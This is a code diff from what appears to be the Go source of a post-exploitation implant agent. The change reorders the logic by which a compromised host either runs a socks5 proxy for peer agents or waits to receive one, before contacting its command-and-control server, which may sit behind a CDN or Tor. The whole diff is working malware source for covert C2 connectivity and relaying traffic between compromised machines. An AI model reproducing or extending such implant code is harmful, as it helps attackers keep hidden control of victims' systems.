@@ -98,31 +98,6 @@ func main() {
 	// start socket listener
 	go socketListen()
 
-	// do we have internet?
-	if tun.HasInternetAccess() {
-		// if we do, we are feeling helpful
-		ctx, cancel := context.WithCancel(context.Background())
-		log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
-		go agent.StartBroadcast(true, ctx, cancel)
-
-	} else if !tun.IsTor(agent.CCAddress) {
-		// we don't, just wait for some other agents to help us
-		log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
-		ctx, cancel := context.WithCancel(context.Background())
-		go func() {
-			err := agent.BroadcastServer(ctx, cancel, "")
-			if err != nil {
-				log.Fatal(err)
-			}
-		}()
-		for ctx.Err() == nil {
-			if agent.AgentProxy != "" {
-				log.Printf("[+] Thank you! We got a proxy: %s", agent.AgentProxy)
-				break
-			}
-		}
-	}
-
 	// parse C2 address
 	agent.CCIP = strings.Split(agent.CCAddress, "/")[2]
 	// if not using IP as C2, we assume CC is proxied by CDN/tor, thus using default 443 port
@@ -181,8 +156,34 @@ func main() {
 		}
 	}
 
+	// do we have internet?
+	if tun.HasInternetAccess() {
+		// if we do, we are feeling helpful
+		ctx, cancel := context.WithCancel(context.Background())
+		log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
+		go agent.StartBroadcast(true, ctx, cancel)
+
+	} else if !tun.IsTor(agent.CCAddress) && !tun.IsProxyOK(agent.AgentProxy) {
+		// we don't, just wait for some other agents to help us
+		log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
+		ctx, cancel := context.WithCancel(context.Background())
+		go func() {
+			err := agent.BroadcastServer(ctx, cancel, "")
+			if err != nil {
+				log.Fatal(err)
+			}
+		}()
+		for ctx.Err() == nil {
+			if agent.AgentProxy != "" {
+				log.Printf("[+] Thank you! We got a proxy: %s", agent.AgentProxy)
+				break
+			}
+		}
+	}
+
 	// apply whatever proxy setting we have just added
 	agent.HTTPClient = tun.EmpHTTPClient(agent.AgentProxy)
+	log.Printf("Using proxy: %s", agent.AgentProxy)
 connect:
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
 	if !agent.IsCCOnline(agent.AgentProxy) {
